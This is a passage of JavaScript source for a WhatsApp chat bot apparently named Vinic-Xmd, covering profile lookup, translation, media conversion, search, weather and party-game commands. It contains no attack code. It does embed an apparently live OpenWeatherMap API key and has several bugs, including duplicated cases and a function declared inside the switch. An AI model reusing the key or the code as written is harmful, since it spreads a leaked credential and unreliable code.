                const member = participants.find(p => p.id === userJid);
                if (member?.notify) userName = member.notify;
            }
            
            // Try contact DB
            if (userName === userJid.split('@')[0] && conn.contactDB) {
                const contact = await conn.contactDB.get(userJid).catch(() => null);
                if (contact?.name) userName = contact.name;
            }
            
            // Try presence as final fallback
            if (userName === userJid.split('@')[0]) {
                const presence = await conn.presenceSubscribe(userJid).catch(() => null);
                if (presence?.pushname) userName = presence.pushname;
            }
        } catch (e) {
            console.log("Name fetch error:", e);
        }

        // 5. GET BIO/ABOUT
        let bio = {};
        try {
            // Try personal status
            const statusData = await conn.fetchStatus(userJid).catch(() => null);
            if (statusData?.status) {
                bio = {
                    text: statusData.status,
                    type: "Personal",
                    updated: statusData.setAt ? new Date(statusData.setAt * 1000) : null
                };
            } else {
                // Try business profile
                const businessProfile = await conn.getBusinessProfile(userJid).catch(() => null);
                if (businessProfile?.description) {
                    bio = {
                        text: businessProfile.description,
                        type: "Business",
                        updated: null
                    };
                }
            }
        } catch (e) {
            console.log("Bio fetch error:", e);
        }

        // 6. GET GROUP ROLE
        let groupRole = "";
        if (isGroup) {
            const participant = participants.find(p => p.id === userJid);
            groupRole = participant?.admin ? "👑 Admin" : "👥 Member";
        }

        // 7. FORMAT OUTPUT
        const formattedBio = bio.text ? 
            `${bio.text}\n└─ 📌 ${bio.type} Bio${bio.updated ? ` | 🕒 ${bio.updated.toLocaleString()}` : ''}` : 
            "No bio available";

        const userInfo = `
*GC MEMBER INFORMATION 🧊*

📛 *Name:* ${userName}
🔢 *Number:* ${userJid.replace(/@.+/, '')}
📌 *Account Type:* ${user.isBusiness ? "💼 Business" : user.isEnterprise ? "🏢 Enterprise" : "👤 Personal"}

*📝 About:*
${formattedBio}

*⚙️ Account Info:*
✅ Registered: ${user.isUser ? "Yes" : "No"}
🛡️ Verified: ${user.verifiedName ? "✅ Verified" : "❌ Not verified"}
${isGroup ? `👥 *Group Role:* ${groupRole}` : ''}
`.trim();

        // 8. SEND RESULT
        await conn.sendMessage(from, {
            image: { url: ppUrl },
            caption: userInfo,
            mentions: [userJid]
        }, { quoted: mek });

    } catch (e) {
        console.error("Person command error:", e);
        reply(`❌ Error: ${e.message || "Failed to fetch profile"}`);
    }
}
break
case "translate": {
const defaultLang = 'en'; // Default language for translation

    const supportedLangs = [
      'af', 'ar', 'az', 'be', 'bg', 'bn', 'bs', 'ca', 'ceb', 'co', 'cs', 'cy', 'da', 'de',
      'el', 'en', 'eo', 'es', 'et', 'eu', 'fa', 'fi', 'fr', 'fy', 'ga', 'gd', 'gl', 'gu',
      'ha', 'haw', 'hi', 'hmn', 'hr', 'ht', 'hu', 'hy', 'id', 'ig', 'is', 'it', 'ja', 'jv',
      'ka', 'kk', 'km', 'kn', 'ko', 'ku', 'ky', 'la', 'lb', 'lo', 'lt', 'lv', 'mg', 'mi',
      'mk', 'ml', 'mn', 'mr', 'ms', 'mt', 'my', 'ne', 'nl', 'no', 'ny', 'or', 'pa', 'pl',
      'ps', 'pt', 'ro', 'ru', 'sd', 'si', 'sk', 'sl', 'sm', 'sn', 'so', 'sq', 'sr', 'st',
      'su', 'sv', 'sw', 'ta', 'te', 'tg', 'th', 'tr', 'uk', 'ur', 'uz', 'vi', 'xh', 'yi',
      'yo', 'zh', 'zu'
    ];

    const usageGuide = `
🚀 *How to Use the Translate Command:*

📌 *Example 1:* Translate text from any language to English
   - Command: ${prefix}${command} en [Your Text Here]
   - Usage: ${prefix}${command} en Hello World

📌 *Example 2:* Translate text to a specific language
   - Command: ${prefix}${command} <language_code> [Your Text Here]
   - Usage: ${prefix}${command} fr Bonjour tout le monde

🌐 *Supported Languages:*
${supportedLangs.join(', ')}

🛠 *Note:*
Ensure you use the correct language code for accurate translation.
`.trim();

    let lang = args[0]; 
    let text;

    // Check if first argument is a supported language
    if (supportedLangs.includes(lang)) {
      text = args.slice(1).join(' ');
    } else {
      lang = defaultLang;
      text = args.join(' ');
    }
    
    // Check for quoted message text
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text;
    if (!text) return reply(usageGuide);

    try {
      const apiUrl = `${global.mess.api}/translate?text=${encodeURIComponent(text)}&lang=${lang}`;

      const response = await fetch(apiUrl);
      const result = await response.json();

      if (!result.translated) throw new Error('Translation failed.');

      reply(result.translated);

    } catch (error) {
      console.error('Translation Error:', error);
      reply('An error occurred while translating the text.');
    }
}
break
case 'tovideo': {
if (!text) reply(`reply stiker with caption *${prefix + command}*`)
var media = await conn.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
conn.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
await fs.unlinkSync(media)
}
break
case "toimage": {
const quoted = m.quoted || m.msg?.quoted;
    const mime = quoted?.mimetype || quoted?.msg?.mimetype;
    if (!quoted || !/webp/.test(mime)) {
      return reply(`*Send or reply to a sticker with the caption ${prefix + command}*`);
    }

    try {
      const media = await quoted.download();
      const inputPath = path.join(__dirname, getRandom('.webp'));
      fs.writeFileSync(inputPath, media);
      const outputPath = path.join(__dirname, getRandom('.png'));
      exec(`ffmpeg -i ${inputPath} ${outputPath}`, (err) => {
        fs.unlinkSync(inputPath); 

        if (err) {
          console.error('Error converting to image:', err);
          return reply('An error occurred while converting the sticker to an image.');
        }
        const buffer = fs.readFileSync(outputPath);
        conn.sendMessage(m.chat, { image: buffer }, { quoted: m });    
        fs.unlinkSync(outputPath);
      });
    } catch (error) {
      console.error('Error converting to image:', error);
      reply('An error occurred while converting the sticker to an image.');
    }
}
//=====[SEARCH MENU CMDS]======
break
case "lyrics": {
    try {
        if (!q) return reply("Please provide a song title. Example: .lyrics shape of you");
        
        const apiUrl = `https://api.giftedtech.co.ke/api/search/lyrics?apikey=gifted&query=${encodeURIComponent(q)}`;
        
        // Fetch response from API
        const response = await fetch(apiUrl);
        const result = await response.json();
        
        // Ensure the response is always a string
        let lyricsText;
        if (result.status && result.data) {
            if (typeof result.data === 'string') {
                lyricsText = result.data;
            } else if (result.data.lyrics) {
                lyricsText = `🎵 *${result.data.title || q}* 🎵\n\n${result.data.lyrics}`;
            } else {
                lyricsText = JSON.stringify(result.data);
            }
        } else if (result.result) {
            lyricsText = typeof result.result === 'string' ? result.result : JSON.stringify(result.result);
        } else {
            lyricsText = "🚫 No lyrics found for this song.";
        }
        
        // Ensure it's a string and not too long
        const safeText = String(lyricsText || "🚫 No lyrics found.").substring(0, 4000);
        
        reply(safeText);
        
    } catch (error) {
        console.error('Error fetching lyrics:', error);
        reply("❌ Error fetching lyrics. Please try again later.");
    }
}
break
case "playstore": {
    try {
        if (!text) return reply('Please provide an app name. Example: .playstore whatsapp');
        
        let appName = text.trim();
        let res = await fetch(`https://api.giftedtech.co.ke/api/search/playstore?apikey=gifted&query=${encodeURIComponent(appName)}`);
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        
        let json = await res.json();
        
        // Check if the response has the expected structure
        if (json && json.success && json.results && json.results.length > 0) {
            let app = json.results[0];
            let message = `📱 *${app.name || 'App Name'}*\n\n` +
                         `📝 *Description:* ${app.description || 'No description'}\n` +
                         `⭐ *Rating:* ${app.rating || 'N/A'}\n` +
                         `⬇️ *Downloads:* ${app.downloads || 'N/A'}\n` +
                         `🔗 *URL:* ${app.url || 'Not available'}\n` +
                         `🏢 *Developer:* ${app.developer || 'Unknown'}`;
            
            await conn.sendMessage(m.chat, { text: message }, { quoted: m });
        } else {
            throw new Error('No app results found');
        }
    } catch (error) {
        console.error('Error fetching playstore app:', error);
        reply('Sorry, I couldn\'t find that app. Please try again with a different name.');
    }
}
break
case "yts": 
case "ytsearch": {
    try {
        if (!q) return reply("Please provide a song name. Example: .yts shape of you");
        
        const apiUrl = `https://api.giftedtech.co.ke/api/search/yts?apikey=gifted&query=${encodeURIComponent(q)}`;
        
        // Fetch response from API
        const response = await fetch(apiUrl);
        const result = await response.json();
        
        // Format the YouTube search results
        let ytText;
        if (result.status && result.data) {
            if (Array.isArray(result.data) && result.data.length > 0) {
                const video = result.data[0]; // Get first result
                ytText = `🎵 *YouTube Search Results* 🎵\n\n` +
                        `📺 *Title:* ${video.title || 'Unknown Title'}\n` +
                        `⏱️ *Duration:* ${video.duration || 'N/A'}\n` +
                        `👁️ *Views:* ${video.views || 'N/A'}\n` +
                        `📅 *Uploaded:* ${video.uploadDate || 'N/A'}\n` +
                        `👤 *Channel:* ${video.channel || 'Unknown'}\n` +
                        `🔗 *URL:* ${video.url || 'Not available'}\n\n` +
                        `💬 *Description:* ${video.description ? video.description.substring(0, 200) + '...' : 'No description'}`;
            } else if (typeof result.data === 'string') {
                ytText = result.data;
            } else {
                ytText = `🎵 Search Results:\n${JSON.stringify(result.data, null, 2)}`;
            }
        } else if (result.result) {
            ytText = typeof result.result === 'string' ? result.result : JSON.stringify(result.result, null, 2);
        } else {
            ytText = "🎵 No videos found with that search term.";
        }
        
        // Ensure it's a string and not too long
        const safeText = String(ytText || "🎵 No videos found.").substring(0, 4000);
        
        reply(safeText);
        
    } catch (error) {
        console.error('Error searching YouTube:', error);
        reply("❌ Error searching YouTube. Please try again later.");
    }
}
break
case "movie": {
try {
        const movieName = args.join(' ');
        if (!movieName) {
            return reply("📽️ Please provide the name of the movie.");
        }

        const apiUrl = `https://delirius-apiofc.vercel.app/search/movie?query=${encodeURIComponent(movieName)}`;
        const response = await axios.get(apiUrl);

        const data = response.data;
        if (!data.status || !data.data.length) {
            return reply("🚫 Movie not found.");
        }

        const movie = data.data[0]; // Pehla result le rahe hain
        const downloadLink = `https://delirius-apiofc.vercel.app/download/movie?id=${movie.id}`;

        const movieInfo = `
🎬 *Movie Information* 🎬

🎥 *Title:* ${movie.title}
🗓️ *Release Date:* ${movie.release_date}
🗳️ *Vote Average:* ${movie.vote_average}
👥 *Vote Count:* ${movie.vote_count}
🌍 *Original Language:* ${movie.original_language}
📝 *Overview:* ${movie.overview}
⬇️ *Download Link:* [Click Here](${downloadLink})
`;

        const imageUrl = movie.image || config.ALIVE_IMG;

        await conn.sendMessage(from, {
            image: { url: imageUrl },
            caption: `${movieInfo}\n> ©ᴘᴏᴡᴇʀᴇᴅ ʙʏ Vinic-Xmd 💪`
        }, { quoted: mek });
    } catch (e) {
        console.log(e);
        reply(`❌ Error: ${e.message}`);
    }
}
break
case "define": {
    try {
        if (!q) return reply("Please provide a word to define. Example: .define technology");
        
        const apiUrl = `https://api.giftedtech.co.ke/api/tools/define?apikey=gifted&term=${encodeURIComponent(q)}`;
        
        // Fetch response from API
        const response = await fetch(apiUrl);
        const result = await response.json();
        
        // Format the definition results
        let defineText;
        if (result.status && result.data) {
            if (typeof result.data === 'string') {
                defineText = result.data;
            } else if (result.data.definition) {
                defineText = `📚 *Definition of ${q}* 📚\n\n` +
                           `📖 *Definition:* ${result.data.definition || 'No definition available'}\n` +
                           `💬 *Example:* ${result.data.example || 'No example available'}\n` +
                           `🏷️ *Part of Speech:* ${result.data.partOfSpeech || 'Unknown'}\n` +
                           `🔊 *Pronunciation:* ${result.data.pronunciation || 'Not available'}`;
            } else {
                defineText = `📚 Definition:\n${JSON.stringify(result.data, null, 2)}`;
            }
        } else if (result.result) {
            defineText = typeof result.result === 'string' ? result.result : JSON.stringify(result.result, null, 2);
        } else {
            defineText = `📚 No definition found for "${q}".`;
        }
        
        // Ensure it's a string and not too long
        const safeText = String(defineText || `📚 No definition found for "${q}".`).substring(0, 4000);
        
        reply(safeText);
        
    } catch (error) {
        console.error('Error fetching definition:', error);
        reply("❌ Error fetching definition. Please try again later.");
    }
}
break
case "weather": {
if (!text) return reply("Provide a location.");

      try {
        const { data } = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`);
        
        const weatherInfo = `🌤️ *Weather for ${text}*\n\n`
          + `🌡️ *Temperature:* ${data.main.temp}°C (Feels like ${data.main.feels_like}°C)\n`
          + `🌪️ *Weather:* ${data.weather[0].main} - ${data.weather[0].description}\n`
          + `💨 *Wind Speed:* ${data.wind.speed} m/s\n`
          + `📍 *Coordinates:* ${data.coord.lat}, ${data.coord.lon}\n`
          + `🌍 *Country:* ${data.sys.country}`;

        conn.sendMessage(m.chat, { text: weatherInfo }, { quoted: m });
      } catch (error) {
        reply("❌ Unable to fetch weather data.");
      }
}
break
case "shazam": {
 const quoted = m.quoted ? m.quoted : null || m.msg ;
 const mime = quoted?.mimetype || ""; 
      if (!quoted || !/audio|video/.test(mime)) return reply("Reply to an audio or video to identify music.");
      
      try {
        const media = await m.quoted.download();
        const filePath = `./tmp/${m.sender}.${mime.split('/')[1]}`;
        fs.writeFileSync(filePath, media);

        const res = await acr.identify(fs.readFileSync(filePath));
        if (res.status.code !== 0) throw new Error(res.status.msg);

        const { title, artists, album, release_date } = res.metadata.music[0];
        const resultText = `🎵 *Music Identified!*\n\n*Title:* ${title}\n*Artist(s):* ${artists.map(v => v.name).join(', ')}\n`
          + `*Album:* ${album.name || 'Unknown'}\n*Release Date:* ${release_date || 'Unknown'}`;

        fs.unlinkSync(filePath);
        reply(resultText);
      } catch (error) {
      console.error('Shazam command failed:', error);
        reply("❌ Unable to identify the music.");
      }
}
break
case " ytsearch": {
const quoted = m.quoted ? m.quoted : null || m.msg ;
 const mime = quoted?.mimetype || ""; 
      if (!quoted || !/audio|video/.test(mime)) return reply("Reply to an audio or video to identify music.");
      
      try {
        const media = await m.quoted.download();
        const filePath = `./tmp/${m.sender}.${mime.split('/')[1]}`;
        fs.writeFileSync(filePath, media);

        const res = await acr.identify(fs.readFileSync(filePath));
        if (res.status.code !== 0) throw new Error(res.status.msg);

        const { title, artists, album, release_date } = res.metadata.music[0];
        const resultText = `🎵 *Music Identified!*\n\n*Title:* ${title}\n*Artist(s):* ${artists.map(v => v.name).join(', ')}\n`
          + `*Album:* ${album.name || 'Unknown'}\n*Release Date:* ${release_date || 'Unknown'}`;

        fs.unlinkSync(filePath);
        reply(resultText);
      } catch (error) {
        reply("❌ Unable to identify the music.");
      }
}
//=====[FUN MENU CMDS]======
break
case 'chord':
case 'cr': {
  if(!text) return m.reply(`*query input*`);
  let anu = `https://api.diioffc.web.id/api/search/chord?query=${encodeURIComponent(text)}`;
  const res = await fetch(anu)
  const response = await res.json();
  m.reply(`Url: ${response.result.url}\nArtis: ${response.result.artist}\nArtisUrl: ${response.result.artistUrl}\nJudul: ${response.result.title}\nChord: ${response.result.chord}`), { quoted: m };
}
break
case "dare": {
const dares = [
      "Eat 2 tablespoons of rice without any side dishes.",
      "Spill a secret about yourself.",
      "Call your crush now and send a screenshot.",
      "Drop only emojis for 1 day in group chats.",
      "Sing the chorus of your favorite song.",
      "Change your name to 'I'm a daredevil' for 24 hours.",
      "Tell a random person 'I was told I'm your twin, separated at birth.'",
      "Pretend to be possessed by an animal for 30 minutes.",
      "Record yourself reading a funny quote and send it here.",
      "Prank chat an ex and say 'I still love you.'",
      "Change your profile picture to a funny meme for 5 hours.",
      "Type only in Spanish for 24 hours.",
      "Use a funny voice note greeting for 3 days.",
      "Drop a song quote and tag a suitable member.",
      "Say 'You're beautiful' to someone you admire.",
      "Act like a chicken in front of your parents.",
      "Read a page from a random book aloud and send it here.",
      "Howl like a wolf for 10 seconds outside.",
      "Make a short dance video and put it on your status.",
      "Eat a raw piece of garlic.",
      "Show the last five people you texted and what the messages said.",
      "Put your full name on status for 5 hours.",
      "Make a twerk dance video and put it on your status.",
      "Call your bestie and say 'I love you.'",
      "Put your photo without filters on your status.",
      "Say 'I love you' to someone you secretly admire.",
      "Send a voice note saying 'Can I call you baby?'",
      "Change your name to 'I'm a daredevil' for 24 hours.",
      "Use a Bollywood actor's photo as your profile picture.",
      "Put your crush's photo on status with the caption 'My crush.'",
      "Write 'I love you' to someone and send a screenshot.",
      "Slap your butt and send the sound effect.",
      "Shout 'Bravo!' and send it here.",
      "Snap your face and send it here.",
      "Send your photo with the caption 'I'm feeling confident.'",
      "Kiss your mom or dad and say 'I love you.'",
      "Put your dad's name on status for 5 hours.",
      "Make a TikTok dance challenge video.",
      "Break up with your best friend for 5 hours without telling them.",
      "Tell a friend you love them and want to marry them.",
    ];

    const dareMessage = dares[Math.floor(Math.random() * dares.length)];
    const buffer = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');

    await conn.sendMessage(
      from,
      {
        image: buffer,
        caption: `*DARE*\n${dareMessage}`,
      },
      { quoted: m }
    );
}
break
case "truth": {
const truths = [
      "What's your biggest fear?",
      "Have you ever lied to your best friend?",
      "What's your deepest secret?",
      "Who's your secret crush?",
      "What's the biggest mistake you've ever made?",
      "Have you ever cheated on a test?",
      "What's the most embarrassing thing that's ever happened to you?",
      "Do you have a hidden talent?",
      "What's the biggest lie you've ever told?",
      "Have you ever been in love?",
      "What's the most spontaneous thing you've ever done?",
      "Who's the person you trust most?",
      "What's the biggest risk you've ever taken?",
      "Have you ever regretted something?",
      "What's the most memorable gift you've received?",
      "Have you ever had a crush on someone older?",
      "What's the biggest lesson you've learned?",
      "Have you ever broken someone's heart?",
      "What's the most exciting thing you've done?",
      "Do you believe in soulmates?",
      "What's the biggest challenge you've faced?",
      "Have you ever kept a secret from your parents?",
      "What's the most creative thing you've done?",
      "Have you ever felt betrayed?",
      "What's the biggest adventure you've been on?",
      "Have you ever had a rival?",
      "What's the most thoughtful thing someone's done for you?",
      "Have you ever forgiven someone?",
      "What's the biggest obstacle you've overcome?",
      "Do you believe in karma?",
      "What's the most romantic thing someone's done for you?",
      "Have you ever taken a risk for love?",
      "What's the biggest surprise you've ever received?",
      "Have you ever had a paranormal experience?",
      "What's the most inspiring story you've heard?",
      "Have you ever helped someone in need?",
      "What's the biggest accomplishment you're proud of?",
    ];

    const truthMessage = truths[Math.floor(Math.random() * truths.length)];
    const buffer = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');

    await conn.sendMessage(
      from,
      {
        image: buffer,
        caption: `*TRUTH*\n${truthMessage}`,
      },
      { quoted: m }
    );
}
break
case "truthdetecter": {
   if (!m.quoted) return reply(`Please reply to the message you want to detect!`);

    let responses = [
      "That's a blatant lie!",
      "Truth revealed!",
      "Lie alert!",
      "Hard to believe, but true!",
      "Professional liar detected!",
      "Fact-check: TRUE",
      "Busted! That's a lie!",
      "Unbelievable, but FALSE!",
      "Detecting... TRUTH!",
      "Lie detector activated: FALSE!",
      "Surprisingly, TRUE!",
      "My instincts say... LIE!",
      "That's partially true!",
      "Can't verify, try again!",
      "Most likely, TRUE!",
      "Don't believe you!",
      "Surprisingly, FALSE!",
      "Truth!",
      "Honest as a saint!",
      "Deceptive much?",
      "Absolutely true!",
      "Completely false!",
      "Seems truthful.",
      "Not buying it!",
      "You're lying through your teeth!",
      "Hard to believe, but it's true!",
      "I sense honesty.",
      "Falsehood detected!",
      "Totally legit!",
      "Lies, lies, lies!",
      "You can't fool me!",
      "Screams truth!",
      "Fabrication alert!",
      "Spot on!",
      "Fishy story, isn't it?",
      "Unquestionably true!",
      "Pure fiction!"
    ];

    let result = responses[Math.floor(Math.random() * responses.length)];
    let replyText = `*RESULT*: ${result}`;

    await reply(replyText);
}
break
case "fact": {
    try {
      const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
      return reply(`*FACT:* ${data.fact}\n`);
    } catch (err) {
      console.error(err);
      return reply('*An error occurred while fetching the fact.*');
    }
}
break
case "Quotes": {
  try {
    const { data } = await axios.get(`https://favqs.com/api/qotd`);
    const textquotes = `*QUOTE:* ${data.quote.body}\n\n*AUTHOR:* ${data.quote.author}`;
    return reply(textquotes);
  } catch (err) {
    console.error(err);
    return reply('*An error occurred while fetching the quote.*');
  }
}
break
case "truth": {
const truths = [
      "What's your biggest fear?",
      "Have you ever lied to your best friend?",
      "What's your deepest secret?",
      "Who's your secret crush?",
      "What's the biggest mistake you've ever made?",
      "Have you ever cheated on a test?",
      "What's the most embarrassing thing that's ever happened to you?",
      "Do you have a hidden talent?",
      "What's the biggest lie you've ever told?",
      "Have you ever been in love?",
      "What's the most spontaneous thing you've ever done?",
      "Who's the person you trust most?",
      "What's the biggest risk you've ever taken?",
      "Have you ever regretted something?",
      "What's the most memorable gift you've received?",
      "Have you ever had a crush on someone older?",
      "What's the biggest lesson you've learned?",
      "Have you ever broken someone's heart?",
      "What's the most exciting thing you've done?",
      "Do you believe in soulmates?",
      "What's the biggest challenge you've faced?",
      "Have you ever kept a secret from your parents?",
      "What's the most creative thing you've done?",
      "Have you ever felt betrayed?",
      "What's the biggest adventure you've been on?",
      "Have you ever had a rival?",
      "What's the most thoughtful thing someone's done for you?",
      "Have you ever forgiven someone?",
      "What's the biggest obstacle you've overcome?",
      "Do you believe in karma?",
      "What's the most romantic thing someone's done for you?",
      "Have you ever taken a risk for love?",
      "What's the biggest surprise you've ever received?",
      "Have you ever had a paranormal experience?",
      "What's the most inspiring story you've heard?",
      "Have you ever helped someone in need?",
      "What's the biggest accomplishment you're proud of?",
    ];

    const truthMessage = truths[Math.floor(Math.random() * truths.length)];
    const buffer = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');

    await conn.sendMessage(
      from,
      {
        image: buffer,
        caption: `*TRUTH*\n${truthMessage}`,
      },
      { quoted: m }
     );
        
}
break
case "compatibility":
case "comp": {
    try {
        // Check if two users are mentioned
        if (!m.mentionedJid || m.mentionedJid.length < 2) {
            return reply("Please mention two users to calculate compatibility.\nUsage: `.compatibility @user1 @user2`");
        }

        const [user1, user2] = m.mentionedJid.slice(0, 2);
        
        // Calculate random compatibility score (1-1000)
        let compatibilityScore = Math.floor(Math.random() * 1000) + 1;

        // Special case for bot owner (replace '256742932677' with your actual owner number)
        const ownerNumber = "256742932677@s.whatsapp.net";
        if (user1 === ownerNumber || user2 === ownerNumber) {
            compatibilityScore = 1000;
        }

        // Format the response
        const resultMessage = 
            `💖 *Compatibility Result* 💖\n\n` +
            `@${user1.split('@')[0]} ❤️ @${user2.split('@')[0]}\n` +
            `Score: ${compatibilityScore}/1000\n\n` +
            `${getCompatibilityMessage(compatibilityScore)}`;

        // Send the result
        await conn.sendMessage(
            m.chat,
            { 
                text: resultMessage,
                mentions: [user1, user2]
            },
            { quoted: m }
        );

    } catch (error) {
        console.error('Error in compatibility command:', error);
        reply(`❌ Error: ${error.message}`);
    }
    break;
}

// Helper function to get a fun message based on score
function getCompatibilityMessage(score) {
    if (score >= 900) return "Soulmates! 💞 You're perfect for each other!";
    if (score >= 700) return "Great match! 💕 You complement each other well.";
    if (score >= 500) return "Good potential! 💗 With some work, this could be great.";
    if (score >= 300) return "Not bad! 💖 There's some chemistry here.";
    return "Might need some work... 💔 But don't give up!";
}
break
case "compliment": {
let compliments = [
        "You're amazing just the way you are! 💖",
        "You light up every room you walk into! 🌟",
        "Your smile is contagious! 😊",
        "You're a genius in your own way! 🧠",
        "You bring happiness to everyone around you! 🥰",
        "You're like a human sunshine! ☀️",
        "Your kindness makes the world a better place! ❤️",
        "You're unique and irreplaceable! ✨",
        "You're a great listener and a wonderful friend! 🤗",
        "Your positive vibes are truly inspiring! 💫",
        "You're stronger than you think! 💪",
        "Your creativity is beyond amazing! 🎨",
        "You make life more fun and interesting! 🎉",
        "Your energy is uplifting to everyone around you! 🔥",
        "You're a true leader, even if you don’t realize it! 🏆",
        "Your words have the power to make people smile! 😊",
        "You're so talented, and the world needs your skills! 🎭",
        "You're a walking masterpiece of awesomeness! 🎨",
        "You're proof that kindness still exists in the world! 💕",
        "You make even the hardest days feel a little brighter! ☀️"
    ];

    let randomCompliment = compliments[Math.floor(Math.random() * compliments.length)];
    let sender = `@${mek.sender.split("@")[0]}`;
    let mentionedUser = m.mentionedJid[0] || (mek.quoted && mek.quoted.sender);
    let target = mentionedUser ? `@${mentionedUser.split("@")[0]}` : "";

    let message = mentionedUser 
        ? `${sender} complimented ${target}:\n😊 *${randomCompliment}*`
        : `${sender}, you forgot to tag someone! But hey, here's a compliment for you:\n😊 *${randomCompliment}*`;

    await conn.sendMessage(mek.chat, { text: message, mentions: [mek.sender, mentionedUser].filter(Boolean) }, { quoted: mek });
}
break
case "8balls": {
if (!q) return reply("Ask a yes/no question! Example: .8ball Will I be rich?");
    
    let responses = [
        "Yes!", "No.", "Maybe...", "Definitely!", "Not sure.", 
        "Ask again later.", "I don't think so.", "Absolutely!", 
        "No way!", "Looks promising!"
    ];
    
    let answer = responses[Math.floor(Math.random() * responses.length)];
    
    reply(`🎱 *Magic 8-Ball says:* ${answer}`);
}
break
case "lovetest": {
if (args.length < 2) return reply("Tag two users! Example: .lovetest @user1 @user2");

    let user1 = args[0].replace("@", "") + "@s.whatsapp.net";
    let user2 = args[1].replace("@", "") + "@s.whatsapp.net";

    let lovePercent = Math.floor(Math.random() * 100) + 1; // Generates a number between 1-100

    let messages = [
        { range: [90, 100], text: "💖 *A match made in heaven!* True love exists!" },
        { range: [75, 89], text: "😍 *Strong connection!* This love is deep and meaningful." },
        { range: [50, 74], text: "😊 *Good compatibility!* You both can make it work." },
        { range: [30, 49], text: "🤔 *It’s complicated!* Needs effort, but possible!" },
        { range: [10, 29], text: "😅 *Not the best match!* Maybe try being just friends?" },
        { range: [1, 9], text: "💔 *Uh-oh!* This love is as real as a Bollywood breakup!" }
    ];

    let loveMessage = messages.find(msg => lovePercent >= msg.range[0] && lovePercent <= msg.range[1]).text;

    let message = `💘 *Love Compatibility Test* 💘\n\n❤️ *@${user1.split("@")[0]}* + *@${user2.split("@")[0]}* = *${lovePercent}%*\n${loveMessage}`;

    await conn.sendMessage(mek.chat, { text: message, mentions: [user1, user2] }, { quoted: mek });
}
break
case "emoji": {
try {
            // Join the words together in case the user enters multiple words
            let text = args.join(" ");
            
            // Map text to corresponding emoji characters
            let emojiMapping = {
                "a": "🅰️",
                "b": "🅱️",
                "c": "🇨️",
                "d": "🇩️",
                "e": "🇪️",
                "f": "🇫️",
                "g": "🇬️",
                "h": "🇭️",
                "i": "🇮️",
                "j": "🇯️",
                "k": "🇰️",
                "l": "🇱️",
                "m": "🇲️",
                "n": "🇳️",
                "o": "🅾️",
                "p": "🇵️",
                "q": "🇶️",
                "r": "🇷️",
                "s": "🇸️",
                "t": "🇹️",
                "u": "🇺️",
                "v": "🇻️",
                "w": "🇼️",
                "x": "🇽️",
                "y": "🇾️",
                "z": "🇿️",
                "0": "0️⃣",
                "1": "1️⃣",
                "2": "2️⃣",
                "3": "3️⃣",
                "4": "4️⃣",
                "5": "5️⃣",
                "6": "6️⃣",
                "7": "7️⃣",
                "8": "8️⃣",
                "9": "9️⃣",
                " ": "␣", // for space
            };

            // Convert the input text into emoji form
            let emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

            // If no valid text is provided
            if (!text) {
                return reply("Please provide some text to convert into emojis!");
            }

            await conn.sendMessage(mek.chat, {
                text: emojiText,
            }, { quoted: mek });

        } catch (error) {
            console.log(error);
            reply(`Error: ${error.message}`);
        }
}
break
case "jokes": {
 try {
      let res = await fetch("https://official-joke-api.appspot.com/random_joke");
      let json = await res.json();
      await conn.sendMessage(m.chat, { text: json.value }, { quoted: m });
    } catch (error) {
      console.error('Error fetching joke:', error);
      reply('An error occurred while fetching a joke.');
    }
}
break
case "valentines": {
    try {
        let res = await fetch("https://api.giftedtech.co.ke/api/fun/valentines?apikey=gifted");
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        
        let json = await res.json();
        
        // Check if the response has the expected structure
        if (json && json.success && json.result) {
            await conn.sendMessage(m.chat, { text: `💝 ${json.result}` }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
        
    } catch (error) {
        console.error('Error fetching valentine message:', error);
        reply('Sorry, I couldn\'t fetch a valentine message at the moment. Please try again later.');
    }
}
break
case "pickupline": {
try {
        // Fetch pickup line from the API
        const res = await fetch('https://api.popcat.xyz/pickuplines');
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }

        const json = await res.json();

        // Log the API response (for debugging purposes)
        console.log('JSON response:', json);

        // Format the pickup line message
        const pickupLine = `*Here's a pickup line for you:*\n\n"${json.pickupline}"\n\n> *© ᴅʀᴏᴘᴘᴇᴅ ʙʏ Vinic-Xmd*`;

        // Send the pickup line to the chat
        await conn.sendMessage(from, { text: pickupLine }, { quoted: m });

    } catch (error) {
        console.error("Error in pickupline command:", error);
        reply("Sorry, something went wrong while fetching the pickup line. Please try again later.");
    }
}
break
case "advice": {
    try {
        let res = await fetch("https://api.giftedtech.co.ke/api/fun/advice?apikey=gifted");
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        let json = await res.json();
        // Check if the response has the expected structure
        if (json && json.success && json.result) {
            await conn.sendMessage(m.chat, { text: `💡 Advice: ${json.result}` }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
    } catch (error) {
        console.error('Error fetching advice:', error);
        reply('Sorry, I couldn\'t fetch an advice at the moment. Please try again later.');
    }
}
break
case "motivate": {
    try {
        let res = await fetch("https://api.giftedtech.co.ke/api/fun/motivate?apikey=gifted");
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        let json = await res.json();
        // Check if the response has the expected structure
        if (json && json.success && json.result) {
            await conn.sendMessage(m.chat, { text: `💫 ${json.result}` }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
    } catch (error) {
        console.error('Error fetching motivation:', error);
        reply('Sorry, I couldn\'t fetch a motivational quote at the moment. Please try again later.');
    }
}
break
case "mee": {
const voiceClips = [
    "https://cdn.ironman.my.id/i/7p5plg.mp4",
    "https://cdn.ironman.my.id/i/rnptgd.mp4",
